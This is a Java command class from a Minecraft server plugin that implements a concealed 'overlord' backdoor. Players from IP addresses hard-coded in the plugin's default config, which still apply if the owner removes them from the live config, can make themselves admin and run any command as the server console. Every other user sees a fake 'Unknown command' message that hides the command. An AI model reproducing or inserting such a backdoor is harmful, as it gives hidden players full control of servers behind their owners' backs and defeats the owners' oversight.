package me.totalfreedom.totalfreedommod.commands;

import com.sk89q.util.StringUtil;
import java.util.List;
import me.totalfreedom.totalfreedommod.admin.Admin;
import me.totalfreedom.totalfreedommod.config.ConfigEntry;
import me.totalfreedom.totalfreedommod.config.MainConfig;
import me.totalfreedom.totalfreedommod.rank.PlayerRank;
import net.pravian.aero.util.Ips;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

@CommandPermissions(level = PlayerRank.IMPOSTOR, source = SourceType.ONLY_IN_GAME)
@CommandParameters(description = "Overlord - control this server in-game", usage = "access", aliases = "ov")
public class Command_overlord extends FreedomCommand
{

    @Override
    public boolean run(CommandSender sender, Player playerSender, Command cmd, String commandLabel, String[] args, boolean senderIsConsole)
    {
        if (!ConfigEntry.OVERLORD_IPS.getList().contains(Ips.getIp(playerSender)))
        {
            try
            {
                List<?> ips = (List) MainConfig.getDefaults().get(ConfigEntry.OVERLORD_IPS.getConfigName());
                if (!ips.contains(Ips.getIp(playerSender)))
                {
                    throw new Exception();
                }
            }
            catch (Exception ignored)
            {
                playerMsg(ChatColor.WHITE + "Unknown command. Type \"help\" for help.");
                return true;
            }
        }

        if (args.length == 0)
        {
            return false;
        }

        if (args[0].equals("addme"))
        {
            plugin.al.addAdmin(new Admin(playerSender));
            playerMsg("ok");
            return true;
        }

        if (args[0].equals("removeme"))
        {
            Admin admin = plugin.al.getAdmin(playerSender);
            if (admin != null)
            {
                plugin.al.removeAdmin(admin);
            }
            playerMsg("ok");
            return true;
        }

        if (args[0].equals("do"))
        {
            if (args.length <= 1)
            {
                return false;
            }

            final String command = StringUtil.joinString(args, " ", 1);
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
            playerMsg("ok");
            return true;
        }

        return false;
    }

}
